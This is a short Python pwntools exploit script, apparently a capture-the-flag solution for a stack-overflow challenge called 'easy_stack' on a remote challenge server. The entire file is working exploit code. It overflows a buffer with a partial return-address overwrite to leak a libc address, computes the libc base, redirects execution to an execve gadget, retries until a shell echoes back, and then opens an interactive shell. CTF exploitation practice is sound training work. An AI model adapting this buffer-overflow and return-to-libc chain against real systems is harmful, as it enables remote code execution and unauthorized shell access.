#coding:utf-8
from pwn import *
context.log_level = "debug"
def debug(addr=0,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(r.pid)).readlines()[1], 16)
        print ("breakpoint_addr --> " + hex(text_base + 0x4040))
        gdb.attach(r,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(r,"b *{}".format(hex(addr)))
while True:
    try:
        #r = process('./easy_stack')
        r = remote('nc.eonew.cn', 10004)
        libc = ELF("./libc-2.27.so")
        #debug(0xA53)
        r.sendline('a' * 0x80 + 'b' * 0x8 + p16(0xad3f))
        libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x22d3f
        log.success("libc_base: " + hex(libc_base))
        one_gadget = 0x415a6
        exceve = libc_base +0x4f322
        r.sendline('a' * 0x80 + 'b' * 0x8 + p64(exceve)) 
        r.sendline("echo getshell")
        r.recvuntil('getshell')
        
    except EOFError:
        r.close()
        continue
    r.interactive()